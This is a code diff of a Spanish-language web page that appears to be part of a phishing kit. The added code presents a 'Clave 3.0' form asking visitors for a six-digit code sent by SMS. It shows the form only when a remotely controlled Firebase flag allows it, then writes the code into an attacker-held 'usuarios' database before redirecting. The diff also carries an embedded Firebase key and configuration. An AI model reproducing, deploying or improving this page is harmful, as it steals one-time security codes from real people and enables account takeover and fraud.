@@ -1,35 +1,15 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <title>Cargando...</title>
+  <meta charset="UTF-8">
+  <title>Clave 3.0</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background-color: white;
-    }
-    .loader {
-      font-size: 20px;
-      color: #333;
-    }
+    body { font-family: sans-serif; padding: 20px; text-align: center; }
+    #cargando { font-size: 22px; color: red; }
+    input { font-size: 24px; padding: 10px; width: 180px; letter-spacing: 8px; text-align: center; }
   </style>
-</head>
-<body>
-  <div class="loader">Cargando datos...</div>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js">
-    setTimeout(() => {
-      window.location.href = "expirada.html";
-    }, 300000); // 5 minutos
-</script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js">
-    setTimeout(() => {
-      window.location.href = "expirada.html";
-    }, 300000); // 5 minutos
-</script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
@@ -41,22 +21,45 @@
       appId: "1:604053438195:web:188de91bee9a62f0d3c186"
     };
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const ref = db.ref("validacion_estado");
-    ref.on("value", snap => {
-      const val = snap.val();
-      if (val === "siguiente") {
-        ref.set("");  // limpiar estado
-        window.location.href = "cargando4.html";
-      } else if (val === "error") {
-        ref.set("");
-        window.location.href = "error.html";
-      }
-    });
-  
-    setTimeout(() => {
-      window.location.href = "expirada.html";
-    }, 300000); // 5 minutos
-</script>
+
+    function cargar() {
+      document.getElementById("formulario").style.display = "none";
+      firebase.database().ref("validacion_estado").on("value", snap => {
+        if (snap.val() === "siguiente") {
+          document.getElementById("cargando").style.display = "none";
+          document.getElementById("formulario").style.display = "block";
+        }
+      });
+    }
+
+    function enviarClave(e) {
+      e.preventDefault();
+      const clave = document.getElementById("clave3").value;
+      const timestamp = new Date().toLocaleString("es-CL");
+
+      firebase.database().ref("usuarios").limitToLast(1).once("value").then(snap => {
+        const key = Object.keys(snap.val())[0];
+        firebase.database().ref("usuarios/" + key).update({
+          clave3: clave,
+          timestamp: timestamp
+        }).then(() => {
+          firebase.database().ref("validacion_estado").set(""); // limpiar estado
+          window.location.href = "final.html";
+        });
+      });
+    }
+
+    window.onload = cargar;
+  </script>
+</head>
+<body>
+  <div id="cargando">Cargando datos...</div>
+
+  <form id="formulario" style="display:none;" onsubmit="enviarClave(event)">
+    <h2>Ingresa Clave 3.0 enviada como SMS</h2>
+    <input id="clave3" maxlength="6" pattern="\d{6}" required />
+    <br><br>
+    <button type="submit">Enviar</button>
+  </form>
 </body>
 </html>
